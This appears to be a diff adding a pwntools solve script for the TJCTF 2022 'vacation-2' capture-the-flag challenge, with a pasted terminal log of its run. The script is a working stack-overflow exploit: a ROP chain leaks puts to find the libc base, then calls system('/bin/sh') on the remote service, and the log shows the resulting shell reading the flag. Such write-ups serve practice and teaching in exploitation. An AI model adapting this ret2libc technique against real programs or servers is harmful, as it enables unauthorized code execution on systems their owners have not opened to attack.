@@ -1,0 +1,75 @@
+from pwn import *
+
+#context(os='linux', arch='amd64')
+#context.log_level = 'debug'
+
+BINARY = './chall'
+elf  = ELF(BINARY)
+
+if len(sys.argv) > 1 and sys.argv[1] == 'r':
+  HOST = "tjc.tf"
+  PORT = 31705
+  s = remote(HOST, PORT)
+else:
+  s = process(BINARY)
+libc = elf.libc
+
+pop_rdi_ret = 0x401243 # pop rdi; ret;
+
+buf  = b"A"*24
+buf += p64(pop_rdi_ret)
+buf += p64(elf.got.puts)
+buf += p64(elf.plt.puts)
+buf += p64(elf.sym.main)
+s.sendline(buf)
+
+s.recvuntil("Where am I going today?\n")
+puts_addr   = u64(s.recvuntil("\n")[:-1] + b"\x00\x00")
+libc_base   = puts_addr - libc.sym.puts
+system_addr = libc_base + libc.sym.system
+binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))
+
+print("puts_addr   =", hex(puts_addr))
+print("libc_base   =", hex(libc_base))
+
+buf  = b"A"*24
+buf += p64(pop_rdi_ret+1)
+buf += p64(pop_rdi_ret)
+buf += p64(binsh_addr)
+buf += p64(system_addr)
+s.sendline(buf)
+
+s.interactive()
+
+'''
+mito@ubuntu:~/CTF/TJCTF_2022/Pwn_vacation-2$ python3 solve.py r
+[*] '/home/mito/CTF/TJCTF_2022/Pwn_vacation-2/chall'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to tjc.tf on port 31705: Done
+[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+solve.py:26: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.recvuntil("Where am I going today?\n")
+solve.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  puts_addr   = u64(s.recvuntil("\n")[:-1] + b"\x00\x00")
+puts_addr   = 0x7fa9136d1450
+libc_base   = 0x7fa91364d000
+[*] Switching to interactive mode
+Where am I going today?
+$ id
+uid=1000 gid=1000 groups=1000
+$ ls -l
+total 24
+-rw-rw-rw- 1 nobody nogroup    48 Apr 21 14:09 flag.txt
+-rwxrwxrwx 1 nobody nogroup 16848 Apr 21 14:09 run
+$ cat flag.txt
+tjctf{w3_g0_wher3_w3_w4nt_t0!_66f7020620e343ff}
+'''
